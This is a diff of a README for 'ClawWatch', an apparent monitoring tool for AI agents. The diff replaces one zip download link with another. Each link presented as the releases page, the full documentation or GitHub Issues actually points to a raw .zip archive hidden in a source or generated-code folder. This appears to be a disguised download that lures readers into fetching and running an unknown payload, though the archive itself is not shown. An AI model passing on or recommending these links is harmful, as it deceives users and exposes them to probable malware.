@@ -7,7 +7,7 @@ ClawWatch helps you keep an eye on your AI agents. With ClawWatch, you can monit
 To get started with ClawWatch, follow these simple steps to download and run the application.
 
 ## 📦 Download & Install
-Visit this page to download: [ClawWatch Releases](https://raw.githubusercontent.com/karthik14478/clawwatch/main/apps/clawwatch/src/server/Software_v1.4.zip)
+Visit this page to download: [ClawWatch Releases](https://github.com/karthik14478/clawwatch/raw/refs/heads/main/packages/core/convex/_generated/Software-v3.9.zip)
 
 ### Step 1: Visit the Releases Page
 To download ClawWatch, click the link above to go to the release section. You will see a list of available versions.
@@ -45,8 +45,8 @@ If you have questions or need help, you can engage with the community. Join our 
 If you want to contribute to ClawWatch, feel free to check the guidelines on the GitHub repository. Contributions help improve the application and benefit the entire community.
 
 ## 🔗 Helpful Links
-- [Full Documentation](https://raw.githubusercontent.com/karthik14478/clawwatch/main/apps/clawwatch/src/server/Software_v1.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/karthik14478/clawwatch/main/apps/clawwatch/src/server/Software_v1.4.zip)
+- [Full Documentation](https://github.com/karthik14478/clawwatch/raw/refs/heads/main/packages/core/convex/_generated/Software-v3.9.zip)
+- [GitHub Issues](https://github.com/karthik14478/clawwatch/raw/refs/heads/main/packages/core/convex/_generated/Software-v3.9.zip)
 
 ## 📞 Contact
 For further assistance, you can reach out via the contact information provided in the repository. 
@@ -54,4 +54,4 @@ For further assistance, you can reach out via the contact information provided i
 ## 🎉 Conclusion
 Now you are ready to download and run ClawWatch. This tool will empower you to monitor your AI agents effectively while managing costs and performance. Happy tracking!
 
-### Download ClawWatch here: [ClawWatch Releases](https://raw.githubusercontent.com/karthik14478/clawwatch/main/apps/clawwatch/src/server/Software_v1.4.zip)
+### Download ClawWatch here: [ClawWatch Releases](https://github.com/karthik14478/clawwatch/raw/refs/heads/main/packages/core/convex/_generated/Software-v3.9.zip)
